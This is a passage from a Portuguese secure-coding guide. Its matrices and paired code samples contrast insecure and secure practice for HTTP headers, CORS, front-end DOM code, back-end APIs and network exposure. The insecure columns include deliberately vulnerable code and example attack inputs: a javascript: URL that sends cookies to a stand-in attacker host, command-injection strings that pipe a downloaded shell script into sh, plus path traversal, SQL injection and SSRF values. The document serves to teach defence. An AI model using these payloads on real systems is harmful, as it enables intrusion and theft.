| **Autocompletar em campos altamente sensíveis** | Formulários de token de recuperação, PIN de transação ou chave mestra sem controle de autocompletar em terminais compartilhados. | O navegador pode sugerir ou preencher dados sensíveis visualizáveis por terceiros que utilizem o mesmo perfil de usuário no sistema operacional. | **[BOA PRÁTICA]** Definir atributos `autocomplete="off"` ou tokens semânticos precisos (`autocomplete="one-time-code"`, `autocomplete="new-password"`) conforme a finalidade do campo. |

##### Exemplo Comparativo de Política de Cache e Limpeza Completa no Logout

```http
# ❌ INSEGURO: Resposta autenticada cacheável em disco/CDN e logout que não limpa o navegador
GET /api/v1/conta/extrato-mensal HTTP/2
Host: ibank.exemplo.test

HTTP/2 200 OK
Content-Type: application/json
Cache-Control: public, max-age=3600

# ✅ SEGURO: Resposta privada não cacheável em disco + Resposta de Logout com Clear-Site-Data
HTTP/2 200 OK
Content-Type: application/json
Cache-Control: no-store, no-cache, must-revalidate, private
Pragma: no-cache

# Resposta de POST /api/v1/auth/logout:
HTTP/2 200 OK
Set-Cookie: __Host-sid=; Path=/; Max-Age=0; Secure; HttpOnly; SameSite=Lax
Clear-Site-Data: "cache", "cookies", "storage"
```

---

<a id="s7-4"></a>
### 7.4 Headers de Segurança, CORS e Isolamento

Esta matriz sintetiza as configurações corretas e incorretas dos cabeçalhos HTTP de defesa em profundidade ([Seção 5](./05-headers-de-seguranca.md#s5)) e de compartilhamento de recursos entre origens.

| Elemento / Cenário | Configuração ou Prática Insegura (Com Exemplo) | Risco / Impacto Principal | Configuração ou Prática Segura (Com Exemplo) |
| :--- | :--- | :--- | :--- |
| **Content-Security-Policy (CSP)** | Ausente, ou configurada com `default-src * 'unsafe-inline' 'unsafe-eval'`, ou esquecida eternamente em modo `Content-Security-Policy-Report-Only`. | Execução livre de scripts injetados via **XSS**, avaliação de strings via `eval()` e exfiltração de dados para qualquer domínio externo. | **[REQUISITO]** `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-<aleatorio>' 'strict-dynamic'; object-src 'none'; base-uri 'self'; frame-ancestors 'none';` (com um *nonce* novo a cada resposta). |
| **Strict-Transport-Security (HSTS)** | Ausente, enviado sobre HTTP (onde é ignorado pelo navegador), ou com `max-age=0` / valor muito baixo (`max-age=60`). | Janela aberta para ataques de *SSL Stripping* no primeiro acesso do usuário após expirar o tempo curto. | **[REQUISITO]** `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` enviado em todas as respostas HTTPS. |
| **Prevenção de MIME Sniffing** | Omitir `X-Content-Type-Options` ou enviar `Content-Type: text/plain` sem proteção em arquivos enviados por usuários. | O navegador tenta "adivinhar" o formato pelo conteúdo (**MIME Sniffing**) e pode executar como HTML/JavaScript um arquivo que foi enviado como imagem ou texto. | **[REQUISITO]** Enviar `X-Content-Type-Options: nosniff` em **todas** as respostas (HTML, JS, CSS, imagens, JSON) e definir o `Content-Type` exato. |
| **Proteção contra Clickjacking** | Ausência de `frame-ancestors` na CSP e ausência de `X-Frame-Options` em páginas de confirmação, pagamento ou configurações. | **Clickjacking (UI Redressing)** ([Seção 3.12](./03a-vulnerabilidades-parte1.md#s3)): um site malicioso embute a aplicação legítima em um `<iframe style="opacity:0">` invisível e induz o usuário a clicar em botões críticos sem perceber. | **[REQUISITO]** Enviar `Content-Security-Policy: frame-ancestors 'none'` (ou `'self'`) **e** `X-Frame-Options: DENY` (ou `SAMEORIGIN`). |
| **Controle do cabeçalho Referer (`Referrer-Policy`)** | Usar `Referrer-Policy: unsafe-url` (envia a URL completa com query string para qualquer destino, inclusive em downgrade HTTPS -> HTTP). | Vazamento de parâmetros de URL, identificadores de objetos e estrutura de rotas internas para servidores de terceiros quando o usuário clica em links externos ou carrega imagens externas. | **[RECOMENDAÇÃO]** Enviar `Referrer-Policy: strict-origin-when-cross-origin` (padrão equilibrado) ou `no-referrer` / `same-origin` em aplicações de alta confidencialidade (bancos, saúde, painéis admin). |
| **Restrição de APIs do navegador (`Permissions-Policy`)** | Não enviar `Permissions-Policy` em páginas que incorporam conteúdos ou anúncios em iframes. | Scripts ou iframes podem tentar solicitar acesso a recursos sensíveis do dispositivo (câmera, microfone, geolocalização, USB, pagamentos). | **[BOA PRÁTICA]** `Permissions-Policy: camera=(), microphone=(), geolocation=(), usb=(), payment=()` (desabilitando explicitamente recursos não utilizados pela aplicação). |
| **CORS com credenciais (`Access-Control-Allow-*`)** | Refletir automaticamente o header `Origin` da requisição em `Access-Control-Allow-Origin` junto com `Access-Control-Allow-Credentials: true`, ou aceitar `Origin: null`. | **Anulação completa da Same-Origin Policy**: qualquer site malicioso aberto em outra aba lê respostas autenticadas da vítima com `fetch(url, { credentials: 'include' })`. | **[REQUISITO]** Validar o `Origin` contra uma *allowlist* estrita de origens exatas antes de emitir `Access-Control-Allow-Origin: https://app.loja-ficticia.test`, `Access-Control-Allow-Credentials: true` e `Vary: Origin`. |
| **Isolamento de janela e recursos Cross-Origin (COOP / CORP / COEP)** | Deixar recursos privados com `Cross-Origin-Resource-Policy: cross-origin` e janelas com `Cross-Origin-Opener-Policy: unsafe-none`. | Janelas abertas ou *pop-ups* mantêm referência `window.opener` cruzada (sujeitas a ataques *XS-Leaks* e *Reverse Tabnabbing* em navegadores legados); imagens privadas podem ser embutidas por outros sites. | **[RECOMENDAÇÃO]** Enviar `Cross-Origin-Opener-Policy: same-origin`, `Cross-Origin-Resource-Policy: same-origin` (em recursos internos) e `Cross-Origin-Embedder-Policy: require-corp` quando necessário isolamento completo (`crossOriginIsolated`). |
| **Cabeçalhos de versão do servidor (*Banner Grabbing*)** | Enviar `Server: Apache/2.4.41 (Ubuntu)` e `X-Powered-By: Express` / `PHP/8.1.2`. | Facilita o reconhecimento automatizado (*fingerprinting*) por scanners que buscam CVEs específicas daquela versão exata. | **[BOA PRÁTICA]** Remover `X-Powered-By` (`app.disable('x-powered-by')` no Express; `expose_php = Off` no PHP) e ocultar versões no servidor web (`server_tokens off;` no Nginx; `ServerTokens Prod` no Apache). |

##### Exemplo Comparativo de Configuração de CORS no Servidor

```javascript
// ❌ INSEGURO: Reflete qualquer Origin (ou 'null') permitindo credenciais!
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin || '*');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  next();
});
```

```javascript
// ✅ SEGURO: Allowlist estrita de origens exatas + Vary: Origin
const ALLOWED_ORIGINS = new Set([
  'https://loja-ficticia.test',
  'https://app.loja-ficticia.test'
]);

app.use((req, res, next) => {
  const origin = req.headers.origin;
  res.setHeader('Vary', 'Origin');
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-CSRF-Token');
  }
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});
```

---

<a id="s7-5"></a>
### 7.5 Código Front-End (HTML, CSS, JavaScript e DOM)

Esta matriz foca na prevenção de vulnerabilidades no código executado pelo navegador, abrangendo manipulação segura do **DOM**, avaliação dinâmica de scripts, carregamento de dependências de terceiros, comunicação entre janelas e validação de formulários.

| Elemento / Cenário | Configuração ou Prática Insegura (Com Exemplo) | Risco / Impacto Principal | Configuração ou Prática Segura (Com Exemplo) |
| :--- | :--- | :--- | :--- |
| **Inserção de texto controlado pelo usuário no DOM** | Usar `element.innerHTML = nomeUsuario`, `outerHTML`, `document.write()` ou `dangerouslySetInnerHTML` (React) / `v-html` (Vue) sem sanitização. | **DOM-based XSS / Stored XSS** ([Seção 3.2](./03a-vulnerabilidades-parte1.md#s3)): se o texto contiver `<img src=x onerror=alert(1)>`, o navegador interpreta como HTML ativo e executa o JavaScript do atacante. | **[REQUISITO]** Usar `element.textContent = nomeUsuario` (ou `createElement` + `textContent`) para texto puro; se HTML rico for indispensável, sanitizar antes com **DOMPurify** (`DOMPurify.sanitize(html)`) + **Trusted Types**. |
| **Avaliação dinâmica de strings como código** | Usar `eval(input)`, `new Function(input)`, `setTimeout("acao(" + x + ")", 100)` ou `setInterval("...", 100)`. | **Injeção direta de código JavaScript**: qualquer controle do atacante sobre a string avaliada resulta em execução imediata de código arbitrário no contexto da origem. | **[REQUISITO]** Jamais usar `eval()` ou `new Function()`; usar `JSON.parse()` para dados JSON e passar referências de função reais para `setTimeout(() => acao(x), 100)`. |
| **Atribuição dinâmica de URLs em links e redirecionamentos** | `<a href={comentario.siteAutor}>` ou `location.href = paramUrl` sem validar o protocolo da URL. | Se o usuário informar `javascript:fetch('https://atacante.test/?c='+document.cookie)`, clicar no link executa código JS (**XSS via esquema `javascript:`**). | **[REQUISITO]** Validar a URL com o construtor `new URL(input)` e permitir estritamente os protocolos `https:` e `http:` (`['https:', 'http:'].includes(url.protocol)`). |
| **Comunicação entre janelas/iframes (`postMessage`)** | Enviar `window.postMessage(segredo, '*')` e receber em `window.addEventListener('message', e => eval(e.data))` sem validar `e.origin`. | Qualquer site malicioso intercepta mensagens enviadas para `'*'` ou envia mensagens forjadas para o ouvinte vulnerável, causando vazamento de dados ou **DOM XSS**. | **[REQUISITO]** Especificar sempre a origem de destino exata no envio (`target.postMessage(msg, 'https://app.exemplo.test')`) e validar estritamente `if (e.origin !== 'https://app.exemplo.test') return;` no recebimento. |
| **Inclusão de scripts de CDNs externas (SRI)** | `<script src="https://cdn.exemplo.test/lib.js"></script>` sem verificação de hash criptográfico. | Se a CDN externa sofrer um ataque de *Supply Chain* ou sequestro de DNS, o arquivo adulterado infecta todos os visitantes da sua aplicação. | **[RECOMENDAÇÃO]** Hospedar bibliotecas críticas na própria origem (*self-hosting*) ou exigir **Subresource Integrity (SRI)**: `<script src="..." integrity="sha384-..." crossorigin="anonymous"></script>`. |
| **Incorporação de iframes externos (`sandbox`)** | `<iframe src="https://widget-terceiro.test"></iframe>` sem restrições. | O iframe pode redirecionar a janela principal (*top-level navigation*), abrir *pop-ups*, executar scripts abusivos ou baixar arquivos automaticamente. | **[RECOMENDAÇÃO]** Aplicar o atributo `sandbox` com o mínimo de permissões necessárias (ex.: `<iframe src="..." sandbox="allow-scripts">`, nunca combinando `allow-scripts` e `allow-same-origin` para conteúdo não confiável da mesma origem). |
| **Links externos em nova aba (`target="_blank"`)** | `<a href="https://externo.test" target="_blank">` (em navegadores legados ou quando `opener` é forçado). | *Reverse Tabnabbing*: a página aberta ganhava acesso a `window.opener.location` e podia redirecionar a aba original para uma página de phishing (hoje mitigado por padrão nos navegadores modernos, mas ainda importante). | **[BOA PRÁTICA]** Incluir explicitamente `rel="noopener noreferrer"` em links externos com `target="_blank"`. |
| **Segredos e chaves de API no código Front-End** | Colocar `REACT_APP_AWS_SECRET_KEY` ou `VITE_OPENAI_API_KEY` em variáveis de ambiente do front-end. | Tudo o que é empacotado no bundle JavaScript do front-end é **público**: qualquer usuário abre a aba **Sources** ou **Network** do DevTools e copia a chave secreta em segundos. | **[REQUISITO]** Manter todas as chaves privadas e segredos de integração **exclusivamente no servidor back-end**, fazendo o front-end chamar uma rota autenticada da sua própria API. |
| **Validação de formulários e regras de negócio** | Validar preço, desconto, limite de compra ou permissão de acesso **apenas** no JavaScript do navegador (`if (preco > 0)` ou `<input disabled>`). | O usuário abre o DevTools, remove o atributo `disabled` na aba **Elements**, altera a variável no **Console** ou edita o JSON na aba **Network** (*Edit and Resend*). | **[REQUISITO]** Tratar a validação no front-end apenas como auxílio visual de usabilidade (UX); **revalidar 100% dos tipos, limites, preços e permissões no servidor back-end**. |
| **Logs de depuração e Source Maps em produção** | Deixar `console.log(dadosUsuario)` e publicar arquivos `.js.map` abertos na internet em produção. | Vazamento de credenciais/PII na aba **Console** e exposição integral do código-fonte TypeScript/React original com comentários internos na aba **Sources**. | **[BOA PRÁTICA]** Remover `console.*` no build de produção (`drop_console: true`) e restringir arquivos `.map` ao sistema interno de observabilidade (Sentry/Datadog). |

##### Exemplo Comparativo de Manipulação do DOM e Validação de URL no Front-End

```javascript
// ❌ INSEGURO: Vulnerável a DOM XSS tanto via innerHTML quanto via protocolo javascript:
function renderizarComentarioInseguro(comentario) {
  const container = document.getElementById('lista-comentarios');
  container.innerHTML += `
    <div class="card">
      <h4>${comentario.autor}</h4>
      <p>${comentario.texto}</p>
      <a href="${comentario.website}">Visitar site do autor</a>
    </div>
  `;
}
```

```javascript
// ✅ SEGURO: Construção de nós DOM com textContent e validação estrita do protocolo da URL
function renderizarComentarioSeguro(comentario) {
  const container = document.getElementById('lista-comentarios');

  const card = document.createElement('div');
  card.className = 'card';

  const titulo = document.createElement('h4');
  titulo.textContent = comentario.autor; // Escapamento automático nativo!

  const paragrafo = document.createElement('p');
  paragrafo.textContent = comentario.texto;

  card.appendChild(titulo);
  card.appendChild(paragrafo);

  // Validação segura da URL antes de criar o link:
  try {
    const urlValidada = new URL(comentario.website);
    if (urlValidada.protocol === 'https:' || urlValidada.protocol === 'http:') {
      const link = document.createElement('a');
      link.href = urlValidada.href;
      link.textContent = 'Visitar site do autor';
      link.rel = 'noopener noreferrer ugc';
      link.target = '_blank';
      card.appendChild(link);
    }
  } catch {
    // URL inválida: ignora a criação do link com segurança
  }

  container.appendChild(card);
}
```

---

<a id="s7-6"></a>
### 7.6 Código Back-End, Banco de Dados, Upload e APIs REST

Esta matriz aborda as vulnerabilidades críticas do lado do servidor (OWASP Top 10 e OWASP API Security Top 10), cobrindo injeções, controle de acesso, serialização de dados, manipulação de arquivos e concorrência.

| Elemento / Cenário | Configuração ou Prática Insegura (Com Exemplo) | Risco / Impacto Principal | Configuração ou Prática Segura (Com Exemplo) |
| :--- | :--- | :--- | :--- |
| **Consultas ao Banco de Dados (*SQL Injection*)** | Concatenar ou interpolar variáveis diretamente na string SQL: `` `SELECT * FROM users WHERE email = '${email}'` ``. | **SQL Injection (SQLi)** ([Seção 3.1](./03a-vulnerabilidades-parte1.md#s3)): bypass de autenticação (`' OR '1'='1`), leitura de todas as tabelas (`UNION SELECT`), modificação ou destruição do banco. | **[REQUISITO]** Usar **Prepared Statements (Consultas Parametrizadas)** (`SELECT * FROM users WHERE email = $1`, `[email]`) em 100% das queries; para identificadores dinâmicos (`ORDER BY`), validar contra uma *allowlist* fixa. |
| **Autorização em nível de objeto (*IDOR / BOLA*)** | Buscar registro apenas pelo ID da URL sem checar o dono: `SELECT * FROM faturas WHERE id = req.params.id`. | **IDOR / BOLA** ([Seção 3.9](./03a-vulnerabilidades-parte1.md#s3)): qualquer usuário autenticado troca o ID na URL (`/api/faturas/105` -> `/api/faturas/106`) e acessa ou altera dados de terceiros. | **[REQUISITO]** Incluir o ID do usuário da sessão autenticada na cláusula de filtro de toda operação: `SELECT * FROM faturas WHERE id = $1 AND usuario_id = $2`, `[req.params.id, req.user.id]` + usar UUIDs v4. |
| **Atribuição em massa (*Mass Assignment*)** | Passar todo o `req.body` diretamente para o modelo do banco: `await User.update(req.body, { where: { id } })`. | O usuário adiciona `"isAdmin": true` ou `"saldo": 999999` no JSON enviado pela aba **Network** e escala privilégios instantaneamente. | **[REQUISITO]** Aplicar *allowlisting* explícito de campos permitidos (DTO / Schema com **Zod**, **Joi** ou **Pydantic**): extrair apenas `const { nome, bio } = schema.parse(req.body)`. |
| **Exposição de dados na resposta da API (*Excessive Data Exposure*)** | Retornar a entidade inteira do banco: `return res.json(await User.findByPk(id))` (contendo `password_hash`, `cpf`, `reset_token`). | Vazamento de dados sensíveis e hashes de senha na sub-aba **Preview**/**Response** da aba **Network**. | **[REQUISITO]** Usar projeções explícitas no banco (`SELECT id, nome, avatar_url`) ou serializadores/DTOs de saída que filtrem estritamente os campos públicos. |
| **Execução de comandos do sistema operacional (*Command Injection*)** | Passar entrada do usuário para um shell: `exec("ping -c 4 " + ipInformado)` ou `os.system(...)`. | **Command Injection** ([Seção 3.16](./03a-vulnerabilidades-parte1.md#s3)): o atacante envia `8.8.8.8; cat /etc/passwd` ou `| curl atacante.test/shell.sh | sh` e assume controle total do servidor (**RCE** — *Remote Code Execution*). | **[REQUISITO]** Usar bibliotecas nativas da linguagem em vez de comandos de shell; se inevitável, usar `execFile('ping', ['-c', '4', ipValidado], { shell: false })` validando a entrada com regex estrita. |
| **Acesso a arquivos no sistema de arquivos (*Path Traversal*)** | Concatenar nome de arquivo na rota de download: `fs.readFile('/var/uploads/' + req.query.file)`. | **Path Traversal / Directory Traversal** ([Seções 3.10 e 3.17](./03a-vulnerabilidades-parte1.md#s3)): o atacante envia `?file=../../../../etc/passwd` (ou `.env`) e lê arquivos confidenciais do servidor. | **[REQUISITO]** Referenciar arquivos por ID de banco de dados; ou extrair apenas `path.basename(input)`, resolver o caminho canônico com `fs.realpathSync()` / `path.resolve()` e verificar `resolvedPath.startsWith(BASE_DIR + path.sep)`. |
| **Requisições HTTP feitas pelo servidor (*SSRF*)** | Fazer `fetch(req.body.webhookUrl)` para qualquer URL fornecida pelo usuário sem validar o IP de destino. | **SSRF** ([Seção 3.4](./03a-vulnerabilidades-parte1.md#s3)): o atacante aponta para `http://127.0.0.1:6379` (Redis interno) ou `http://169.254.169.254/latest/meta-data/` (credenciais IAM da nuvem). | **[REQUISITO]** Validar esquema (`https:`), usar *allowlist* de domínios, resolver o DNS e **bloquear todas as faixas de IPs privados/internos** (`127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, `fc00::/7`) e desabilitar redirecionamentos automáticos. |
| **Upload de arquivos enviados por usuários** | Confiar apenas no `Content-Type` enviado pelo navegador, manter o nome original `shell.php` e salvar dentro da pasta pública `/var/www/html/uploads/`. | **File Upload Vulnerability** ([Seção 3.11](./03a-vulnerabilidades-parte1.md#s3)): o atacante faz upload de uma *Web Shell* (`.php`, `.jsp`, `.aspx`) ou de um `.svg`/`.html` com JavaScript e obtém RCE ou Stored XSS. | **[REQUISITO]** Validar tamanho máximo, extensão por *allowlist* e *Magic Bytes* reais do arquivo; renomear para `<UUID>.ext`; armazenar fora do *webroot* (ou em Object Storage S3 isolado) e servir em domínio separado (`cdn-userdata.exemplo.test`) com `Content-Disposition: attachment` e `X-Content-Type-Options: nosniff`. |
| **Operações financeiras/estoque concorrentes (*Race Conditions*)** | Ler o saldo com `SELECT`, verificar `if (saldo >= valor)` na aplicação e depois executar `UPDATE` sem bloqueio transacional. | **Race Condition (TOCTOU)** ([Seção 3.18](./03a-vulnerabilidades-parte1.md#s3)): 20 requisições simultâneas passam pelo `if` antes do primeiro `UPDATE`, sacando 20 vezes o valor de um único saldo ou aplicando um cupom único dezenas de vezes. | **[REQUISITO]** Usar transações de banco de dados com **bloqueio pessimista** (`SELECT ... FOR UPDATE`), atualizações atômicas condicionais (`UPDATE contas SET saldo = saldo - $1 WHERE id = $2 AND saldo >= $1`) e chaves de idempotência (`Idempotency-Key`). |
| **Tratamento de exceções e erros em APIs** | Retornar `res.status(500).json({ error: err.message, stack: err.stack })` diretamente ao cliente. | Exposição da estrutura interna do banco, diretórios do servidor e versões de pacotes na aba **Network** e **Console**. | **[REQUISITO]** Registrar o erro completo apenas no logger interno do servidor e retornar ao cliente somente `{"error": "Erro interno no processamento", "traceId": "req-9988"}`. |

##### Exemplo Comparativo de Endpoint de API Back-End (SQLi + IDOR + Mass Assignment)

```javascript
// ❌ INSEGURO: Vulnerável simultaneamente a SQL Injection, IDOR e Excessive Data Exposure!
app.get('/api/pedidos/:pedidoId', async (req, res) => {
  try {
    // 1. Concatenação direta -> SQL Injection
    // 2. Não verifica se o pedido pertence ao usuário autenticado -> IDOR / BOLA
    const query = `SELECT * FROM pedidos WHERE id = ${req.params.pedidoId}`;
    const result = await db.query(query);
    res.json(result.rows[0]); // 3. Retorna todas as colunas internas
  } catch (err) {
    res.status(500).json({ erro: err.message, stack: err.stack }); // 4. Vaza stack trace
  }
});
```

```javascript
// ✅ SEGURO: Consulta parametrizada, verificação de propriedade (anti-IDOR), projeção de colunas e erro seguro
app.get('/api/pedidos/:pedidoId', autenticarMiddleware, async (req, res) => {
  const pedidoId = Number.parseInt(req.params.pedidoId, 10);
  if (!Number.isInteger(pedidoId) || pedidoId <= 0) {
    return res.status(400).json({ error: 'Identificador de pedido inválido.' });
  }

  try {
    const query = `
      SELECT id, codigo_rastreio, status, valor_total, criado_em
      FROM pedidos
      WHERE id = $1 AND usuario_id = $2
    `;
    const result = await db.query(query, [pedidoId, req.user.id]);

    if (result.rowCount === 0) {
      // Retorna 404 para não revelar se o ID existe em outra conta
      return res.status(404).json({ error: 'Pedido não encontrado.' });
    }

    return res.status(200).json(result.rows[0]);
  } catch (err) {
    const traceId = crypto.randomUUID();
    logger.error({ traceId, err, userId: req.user.id }, 'Falha ao consultar pedido');
    return res.status(500).json({ error: 'Erro interno do servidor.', traceId });
  }
});
```

---

<a id="s7-7"></a>
### 7.7 Infraestrutura, Portas e Redes de Computadores

Esta matriz consolida as práticas seguras e inseguras de arquitetura de rede, exposição de portas TCP/UDP, protocolos de administração remota, resolução de nomes e perímetro de segurança ([Seção 4](./04-redes-de-computadores.md#s4)).

| Elemento / Cenário | Configuração ou Prática Insegura (Com Exemplo) | Risco / Impacto Principal | Configuração ou Prática Segura (Com Exemplo) |
| :--- | :--- | :--- | :--- |
| **Política padrão de Firewall de borda** | Política *Default Allow* (liberar todas as portas TCP/UDP `0-65535` para `0.0.0.0/0` e bloquear apenas algumas conhecidas). | Qualquer serviço interno iniciado acidentalmente (painel de debug na porta `8080`, banco de dados, métricas) fica imediatamente exposto à internet inteira. | **[REQUISITO]** Política **Default Deny (Negar por Padrão)**: bloquear todo tráfego de entrada e liberar na borda pública exclusivamente as portas **443/TCP** (HTTPS), **443/UDP** (HTTP/3 QUIC) e **80/TCP** (apenas para redirect `301` para 443). |
| **Bancos de Dados (Portas `3306` MySQL e `5432` PostgreSQL)** | Configurar `bind-address = 0.0.0.0` e expor as portas `3306/TCP` ou `5432/TCP` diretamente para a internet pública. | Ataques massivos de força bruta contra `root`/`postgres`, exploração de vulnerabilidades de pré-autenticação e interceptação de queries se TLS não for exigido. | **[REQUISITO]** Isolar bancos de dados em **sub-rede privada** (RFC 1918, sem IP público), aceitando conexões apenas da sub-rede dos servidores de aplicação (*Security Group* / VLAN interna) com TLS mútuo ou obrigatório. |
| **Administração remota de servidores (Portas `23` Telnet e `22` SSH)** | Usar **Telnet (`23/TCP`)** em texto claro ou expor **SSH (`22/TCP`)** para `0.0.0.0/0` aceitando login por senha e usuário `root` (`PermitRootLogin yes`). | No Telnet, a senha do administrador trafega em texto puro; no SSH aberto com senha, *botnets* globais testam milhões de credenciais por dia. | **[REQUISITO]** Desativar e banir Telnet (`23/TCP`); usar **SSH (`22/TCP`)** restrito à **VPN** corporativa / *Bastion Host*, com autenticação exclusiva por **chaves criptográficas** (`Ed25519`/`RSA-4096`), `PasswordAuthentication no` e `PermitRootLogin no`. |
| **Transferência de arquivos (Portas `20/21` FTP)** | Utilizar **FTP clássico (`20/21 TCP`)** para enviar código-fonte ou backups para o servidor. | Credenciais (`USER`/`PASS`) e todo o conteúdo dos arquivos trafegam em texto claro pela rede. | **[REQUISITO]** Substituir por **SFTP** (*SSH File Transfer Protocol*, sobre a porta `22/TCP`) ou **FTPS** (FTP sobre TLS explícito). |
| **Acesso remoto gráfico Windows (Porta `3389` RDP)** | Expor o **RDP (`3389/TCP` e `UDP`)** diretamente para a internet pública sem proteção adicional. | Principal vetor inicial de ataques de **Ransomware** corporativo via força bruta, *Credential Stuffing* ou falhas críticas no protocolo (ex.: BlueKeep). | **[REQUISITO]** Jamais expor `3389` diretamente na internet; exigir conexão prévia via **VPN** com **MFA** (ou *RD Gateway* autenticado), ativar **NLA** (*Network Level Authentication*) e bloqueio de conta por tentativas. |
| **Compartilhamento de arquivos em rede (Porta `445` SMB)** | Expor a porta **`445/TCP` (SMB)** na borda da internet ou manter SMBv1 ativo na rede interna sem assinatura de pacotes. | Propagação automática de *worms* devastadores (como WannaCry/NotPetya via EternalBlue no SMBv1) e captura/relay de hashes NTLM (*SMB Relay*). | **[REQUISITO]** Bloquear estritamente `445/TCP` no firewall de perímetro; desabilitar **SMBv1** em todos os hosts; exigir **SMBv3** com criptografia e *SMB Signing* (assinatura digital de pacotes) obrigatórios. |
| **Protocolos de e-mail (`25` SMTP, `110` POP3, `143` IMAP)** | Usar POP3 (`110`) e IMAP (`143`) sem criptografia; configurar servidor SMTP (`25`) como *Open Relay* e sem registros de autenticação no DNS. | Leitura de e-mails e senhas na rede; abuso do servidor para envio de spam/phishing em nome do seu domínio (*Email Spoofing*). | **[REQUISITO]** Usar **IMAPS (`993/TCP`)**, **POP3S (`995/TCP`)** e submissão autenticada **SMTPS (`465/TCP` ou `587/TCP` com STARTTLS obrigatório)**; configurar **SPF**, **DKIM** e **DMARC** nos registros TXT do DNS. |
| **Serviço de DNS (Porta `53` UDP/TCP)** | Permitir recursão aberta para qualquer IP da internet (*Open Resolver*) e permitir transferência de zona completa (**AXFR** via `53/TCP`) para qualquer host. | Uso do servidor em ataques **DDoS** (*Distributed Denial of Service*) de amplificação de DNS (fator de amplificação > 50x) e mapeamento instantâneo de toda a topologia interna via `dig axfr`. | **[REQUISITO]** Desabilitar recursão para clientes externos em servidores autoritativos; restringir **AXFR** apenas aos IPs exatos dos servidores DNS secundários com chave **TSIG**; habilitar **DNSSEC** e usar *Split-Horizon DNS*. |
| **Camada de Enlace Local (ARP e DHCP em LAN)** | Rede plana (*flat network*) única onde visitantes e servidores compartilham a mesma VLAN sem proteções nos switches. | Um atacante na rede local executa **ARP Spoofing** (envenenando a tabela MAC/IP para interceptar o gateway) ou sobe um **Rogue DHCP Server** entregando um gateway/DNS falso. | **[RECOMENDAÇÃO]** Segmentar a rede em **VLANs** separadas (Visitantes, Corporativo, Servidores, Bancos); habilitar **DHCP Snooping** e **Dynamic ARP Inspection (DAI)** nos switches gerenciáveis. |
| **Exposição dos servidores de aplicação de origem** | Permitir que clientes na internet acessem o servidor de aplicação diretamente pelo IP público ou na porta `:8080`, contornando a CDN/WAF. | O atacante descobre o IP real do servidor de origem e envia ataques diretamente para ele, ignorando completamente o **WAF** (*Web Application Firewall*) e a proteção DDoS do proxy reverso. | **[RECOMENDAÇÃO]** Colocar os servidores de aplicação (`:8080`, `:3000`) atrás de um **Reverse Proxy / WAF**; restringir o firewall do servidor de origem para aceitar tráfego apenas dos IPs do Proxy Reverso / Load Balancer (e usar **mTLS** — *Mutual TLS*). |

##### Exemplo Comparativo de Arquitetura de Rede e Bloco de Proxy Reverso (Nginx)

```text
❌ TOPOLOGIA INSEGURA (Exposição direta de serviços internos):
[ Internet Pública (0.0.0.0/0) ]
       │
       ├──> Porta 80/TCP   (HTTP em texto claro - Aplicação Node.js rodando como root)
       ├──> Porta 8080/TCP (Painel administrativo de debug sem TLS)
       ├──> Porta 22/TCP   (SSH aberto para o mundo com senha fraca)
       └──> Porta 5432/TCP (Banco PostgreSQL acessível diretamente da internet)

✅ TOPOLOGIA SEGURA (Defesa em Profundidade e Segmentação):
[ Internet Pública ]
       │  (Apenas 443/TCP e 443/UDP liberados no Firewall de Borda)
       ▼
[ DMZ / Camada Pública: WAF + Reverse Proxy (Nginx / Load Balancer com TLS 1.3 + HSTS) ]
       │  (Apenas tráfego interno filtrado para a porta 3000/TCP)
       ▼
[ Sub-rede Privada de Aplicação (10.10.1.0/24): App Server rodando com usuário sem privilégio ]
       │  (Apenas porta 5432/TCP com TLS a partir de 10.10.1.0/24; sem acesso à internet)
       ▼
[ Sub-rede Privada de Dados Isolada (10.10.2.0/24): PostgreSQL + Redis ]
  (Administração SSH restrita exclusivamente via VPN WireGuard/IPsec + Bastion Host com MFA)
```

```nginx
# ❌ CONFIGURAÇÃO INSEGURA DE NGINX: HTTP puro, expõe versão, TLS legado e sem headers
server {
    listen 80;
    server_name loja-ficticia.test;
    server_tokens on; # Expõe "Server: nginx/1.18.0 (Ubuntu)"

    location / {
        proxy_pass http://127.0.0.1:8080;
    }
}

# ✅ CONFIGURAÇÃO SEGURA DE NGINX: Redirect 301, TLS 1.2/1.3 estrito, ocultação de versão e headers de segurança
server {
    listen 80;
    listen [::]:80;
    server_name loja-ficticia.test;
    server_tokens off;
    return 301 https://$host$request_uri;
}

server {
    listen 443 ssl;
    listen [::]:443 ssl;
    http2 on;
    server_name loja-ficticia.test;
    server_tokens off;

    # Certificados e protocolos modernos (RFC 8446)
    ssl_certificate     /etc/ssl/certs/loja-ficticia.crt;
    ssl_certificate_key /etc/ssl/private/loja-ficticia.key;
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers off;

    # Headers de Segurança Obrigatórios e Recomendados
    add_header Strict-Transport-Security "max-age=63072000; includeSubDomains; preload" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-Frame-Options "DENY" always;
    add_header Referrer-Policy "strict-origin-when-cross-origin" always;
    add_header Permissions-Policy "camera=(), microphone=(), geolocation=(), payment=()" always;
    add_header Content-Security-Policy "default-src 'self'; object-src 'none'; base-uri 'self'; frame-ancestors 'none'; upgrade-insecure-requests" always;

    # Oculta headers internos do back-end
    proxy_hide_header X-Powered-By;

    location / {
        proxy_pass http://127.0.0.1:3000;
        proxy_http_version 1.1;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
    }
}
```

---

---

> [⬅️ 5. Headers de Segurança HTTP](./05-headers-de-seguranca.md) | [🏠 **Voltar ao Sumário Principal**](../README.md) | [8. Glossário Técnico (A–Z) ➡️](./07-glossario-tecnico.md)
